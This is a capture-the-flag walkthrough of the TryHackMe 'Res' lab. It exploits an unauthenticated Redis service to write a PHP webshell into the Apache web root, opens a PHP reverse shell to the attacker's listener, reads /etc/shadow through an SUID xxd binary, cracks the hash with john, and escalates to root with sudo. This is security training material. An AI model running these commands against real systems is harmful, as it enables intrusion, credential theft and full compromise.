Room: [Res](https://tryhackme.com/room/res)

Difficulty: Easy

Overview: In this room we will exploit Apache webserver path and get an RCE through Redis service. We will also take advantage of an SUID binary and crack some credentials in order to privesc to "root" user.  

------------------------------------------------------------------------------------------------------------------------------------------------------------------

First we will start off our target enumeration by doing "Nmap" scan:

```
nmap -sV -sC -p- res.thm -oN nmap.txt

-sV → Probe open ports to determine service
-sC → Scan using the default set of scripts
-p- → Scan all ports
-oN → Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/131228285-690140dd-4494-40e0-b64c-533e3464a33f.png)

On port 80 there's a simple Apache webserver:

![image](https://user-images.githubusercontent.com/76821053/131228294-7c177622-f45c-4fba-9531-d1341a037e5b.png)

Let's ignore the Apache webserver for now and run the “Redis” service and see if we can find anything usefull:

```
redis-cli

info  → get information and statistics from the server

```

After running 'INFO' i could not fing any Redis databases. The "Keyspace" field is where the databases are listed and there were none.

So i head to [hacktricks website](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) to see how we could exploit "Redis" service:

![image](https://user-images.githubusercontent.com/76821053/131228325-dccf7b1b-96a4-48cf-849e-839796b7af35.png)

Let's try to replicate and get and RCE through the Apache webserver. To do so we need to know its path. So, by default we can assume that the webserver is stored at /var/www/html. 

```
config set dir /var/www/html

config set dbfilename shell.php

set test "<?php phpinfo(); ?>

save
```

![image](https://user-images.githubusercontent.com/76821053/131228371-801b9338-6698-4b97-ae3a-436c0afafdcb.png)

Now we can check the new path that we created with Redis on the Apache webserver:

![image](https://user-images.githubusercontent.com/76821053/131228376-31fa54e5-6e56-4d8c-bdc1-b782a56d4e24.png)

Since we used a php webshell that allows us to input commands we have to add to the url “?cmd=”:

```
http://res.thm/shell.php?cmd=
```

In this example we can see that we can print the contents of /etc/passwd:

![image](https://user-images.githubusercontent.com/76821053/131228403-e44c6db8-2786-437d-9d18-963813801537.png)

It is time to get a reverse shell connection from the webserver to our netcat listener. And to do so we can use this php payload:

```
php -r '$sock=fsockopen("your_ip_address,PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

Setup a netcat listener on your chosen port and run the command:

![image](https://user-images.githubusercontent.com/76821053/131228419-c53d6c5c-8584-47a7-80ac-1ae33cc8775a.png)

Success we recieved a reverse shell connection:

![image](https://user-images.githubusercontent.com/76821053/131228426-b9480285-295a-4f9e-bcf7-4e09275bd50c.png)

Now we have to enumerate the target machine, and we can start by checking for SUID binaries:

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

![image](https://user-images.githubusercontent.com/76821053/131228444-a8c5bf13-6205-41f6-bf13-f7eb353e115c.png)

We have found an interesting SUID binary that we can take advantage of, and it is “xxd”. 

There is an awesome website called [GTFOBins](https://gtfobins.github.io/) which has a list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

If we seach for "xxd" we can see how we will procede in our privilege escalation:

![image](https://user-images.githubusercontent.com/76821053/131228474-3bab939f-062c-4fd7-9e6c-dce114f6c193.png)

Let's read /etc/shadow with “xxd” since it is where all the user passwords hashes are stored:

```
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```

![image](https://user-images.githubusercontent.com/76821053/131228491-9af77f35-479a-4e7f-a79e-9f7f3e5d5d1f.png)

We have found a password hash for user “vianka”. To try and crack this hash with “john the ripper” we will also need /etc/passwd:

![image](https://user-images.githubusercontent.com/76821053/131228503-ffbe92b5-2538-45f5-833b-e695c6b39054.png)

To crack the hash we need to change to our machine and store the contents of /etc/passwd and /etc/shadow in two different files. With a tool called unshadow we are going to merge the two files and send it to “john the ripper”:

```
unshadow passwd shadow > unshadow

john unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/76821053/131228534-a8f86dd0-59e7-4325-a9c2-5c3e958e434f.png)

We cracked “vianka” password. 

On the target machine if we try to change to user "vianka" we will get an error. We need to upgrade our shell to a tty one:

```
python3 -c "__import__('pty').spawn('/bin/bash')"

su vianka
```

![image](https://user-images.githubusercontent.com/76821053/131228575-d171f0f3-a16c-48d4-ae61-f9db09776bce.png)

After upgrading our shell we can use "su" command to change users:

![image](https://user-images.githubusercontent.com/76821053/131228581-01daa1b7-4532-40ab-8176-9d470bc966d8.png)

With user “vianka” let's check what sudo permissions she has. 

```
sudo -l
```

![image](https://user-images.githubusercontent.com/76821053/131228610-7b7cddbe-d1bf-4ddb-8f9d-a7dcd43c72da.png)

We can see that this user can run any command on any host has any user. This means that we can privesc to “root” just by doing:

```
sudo su
```

![image](https://user-images.githubusercontent.com/76821053/131228631-ac61e895-6ada-4e13-b6c9-def4890bae13.png)

Success we are now "root" and the last flag of this room is at /root directory:

![image](https://user-images.githubusercontent.com/76821053/131228643-c7d702ff-5c90-49d7-a8db-b2ceb8e3918e.png)

